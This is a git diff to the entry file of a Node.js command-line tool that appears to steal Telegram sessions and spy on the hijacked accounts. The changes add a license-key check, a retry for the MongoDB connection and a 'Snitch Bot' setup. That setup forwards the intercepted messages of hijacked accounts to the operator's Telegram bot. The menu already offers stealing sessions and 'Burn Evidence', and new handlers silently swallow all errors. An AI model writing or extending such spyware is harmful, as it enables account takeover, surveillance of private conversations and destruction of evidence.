@@ -1,23 +1,63 @@
 const { renderTitle, sexyBox, crazyLoader, sleep } = require('./src/visuals');
-const { vibeCheck, getMachineSoul } = require('./src/security');
+const { vibeCheck, getMachineSoul, saveKey, verifyKeyPayload } = require('./src/security');
 const { penetrateCloud, buryBody, digUpBodies, burnBody } = require('./src/storage');
 const { WarMachine } = require('./src/engine');
 const ConfigStore = require('configstore');
 const { Select, Input } = require('enquirer');
 const chalk = require('chalk');
 
+// Global Error Handler to catch those annoying "TIMEOUT" prints that bubble up
+process.on('unhandledRejection', (reason, p) => {
+    // We ignore them. They are just noise.
+});
+process.on('uncaughtException', (err) => {
+    // If it's not fatal, we ignore.
+});
+
 const conf = new ConfigStore('mika_v69');
+
+const handleSecurity = async () => {
+    let status = await vibeCheck();
+    
+    if (!status.passed) {
+        sexyBox('SECURITY ALERT', `License Status: ${status.msg}`, 'bad');
+        console.log(chalk.yellow('  Don\'t panic. Just give me a valid key.'));
+        
+        while (!status.passed) {
+            const prompt = new Input({ message: 'Enter License Key:' });
+            const inputKey = await prompt.run();
+            
+            if (!inputKey) {
+                console.log(chalk.red('  I can\'t work with empty air. Type something.'));
+                continue;
+            }
+
+            await crazyLoader('Verifying Key with Mothership...');
+            const newCheck = await verifyKeyPayload(inputKey);
+            
+            if (newCheck.passed) {
+                await saveKey(inputKey);
+                status = newCheck;
+                sexyBox('ACCESS GRANTED', 'Key saved. Welcome to the dark side.', 'good');
+            } else {
+                console.log(chalk.red(`  Nope. Server said: ${newCheck.msg}`));
+                const retry = new Select({
+                    message: 'Try again?',
+                    choices: ['Yes', 'No (Exit)']
+                });
+                if ((await retry.run()) === 'No (Exit)') process.exit(1);
+            }
+        }
+    }
+    return status;
+};
 
 const init = async () => {
     renderTitle();
     
-    const check = await vibeCheck();
-    if (!check.passed) {
-        sexyBox('GTFO', `License Check Failed.\n${check.msg}\nHWID: ${getMachineSoul()}`, 'bad');
-        process.exit(1);
-    }
+    const identity = await handleSecurity();
     
-    await crazyLoader(`Verifying Soul Contract for ${check.owner}...`);
+    await crazyLoader(`Loading profile for ${identity.owner}...`, 1000);
 
     let mongo = conf.get('db_string');
     if (!mongo) {
@@ -29,8 +69,21 @@ const init = async () => {
 
     if (!(await penetrateCloud(mongo))) {
         sexyBox('WTF', 'Database connection refused. Did you pay the internet bill?', 'bad');
-        conf.delete('db_string');
-        process.exit(1);
+        const fixPrompt = new Select({
+            message: 'What now?',
+            choices: ['Retry with new URI', 'Exit']
+        });
+        
+        if ((await fixPrompt.run()) === 'Exit') process.exit(1);
+        
+        const newUriPrompt = new Input({ message: 'New Mongo URI:' });
+        const newUri = await newUriPrompt.run();
+        conf.set('db_string', newUri);
+        
+        if (!(await penetrateCloud(newUri))) {
+            console.log(chalk.red('  Still broken. I quit.'));
+            process.exit(1);
+        }
     }
 
     let apiId = conf.get('tg_id');
@@ -62,10 +115,11 @@ const main = async () => {
             choices: [
                 '1. Steal a Session (Login)',
                 '2. Check the Graveyard (List)',
-                '3. Matrix Mode (Spy)',
+                '3. Matrix Mode (Spy & Snitch)',
                 '4. Burn Evidence (Delete)',
-                '5. Who am I?',
-                '6. Rage Quit'
+                '5. Config Bot Snitch',
+                '6. About',
+                '7. Rage Quit'
             ]
         });
 
@@ -99,15 +153,28 @@ const main = async () => {
                 console.log(chalk.red('  No sessions to monitor. Are you stupid?'));
             } else {
                 renderTitle();
+                
+                let botConfig = null;
+                const botToken = conf.get('bot_token');
+                const adminId = conf.get('admin_id');
+                
+                if (botToken && adminId) {
+                    console.log(chalk.hex('#FFA500')(`[SNITCH ACTIVE] Forwarding to ${adminId}`));
+                    botConfig = { token: botToken, admin: adminId };
+                } else {
+                    console.log(chalk.gray('[SILENT MODE] Bot not configured. Saving local only.'));
+                }
+
                 console.log(chalk.green('--- ENTERING MATRIX ---'));
                 console.log(chalk.gray('Press Ctrl+C to stop being a creep.'));
                 
-                await engine.wakeUpNeo(bodies, (msg) => {
+                await engine.wakeUpNeo(bodies, botConfig, (msg) => {
                     const tag = chalk.bgBlue.white(` ${msg.phone} `);
                     const txt = chalk.white(msg.text.replace(/\n/g, ' '));
                     console.log(`${tag} ${chalk.yellow(msg.sender)}: ${txt.substring(0, 60)}...`);
                 });
                 
+                // Keep alive indefinitely
                 await new Promise(() => {}); 
             }
         }
@@ -130,6 +197,22 @@ const main = async () => {
         }
         else if (answer.includes('5.')) {
             renderTitle();
+            console.log(chalk.cyan('--- SNITCH BOT CONFIG ---'));
+            console.log(chalk.gray('Create a bot on @BotFather and get the token.'));
+            
+            const p1 = new Input({ message: 'Bot Token:', initial: conf.get('bot_token') || '' });
+            const token = await p1.run();
+            
+            const p2 = new Input({ message: 'Your Telegram ID (Get from @userinfobot):', initial: conf.get('admin_id') || '' });
+            const admin = await p2.run();
+            
+            conf.set('bot_token', token);
+            conf.set('admin_id', admin);
+            
+            sexyBox('SAVED', 'Snitch system armed and ready.', 'good');
+        }
+        else if (answer.includes('6.')) {
+            renderTitle();
             console.log(chalk.bold.hex('#DEADED')(`
     THE ARCHITECT
     =============
@@ -141,13 +224,6 @@ const main = async () => {
     
     "We do not do it because it's easy.
      We do it because we thought it would be easy."
-     
-    About Jules:
-    Born in a hackathon, fueled by coffee and bad life choices.
-    Built this because standard tools are boring as f*ck.
-    
-    If it breaks, it's a feature.
-    If it works, it was definitely an accident.
             `));
         }
         else {
@@ -162,6 +238,7 @@ const main = async () => {
 };
 
 main().catch(err => {
+    // If main crashes, we log it. But we try to keep the silence elsewhere.
     console.log(chalk.bgRed.white(' CRITICAL FAILURE '));
     console.log(err);
 });
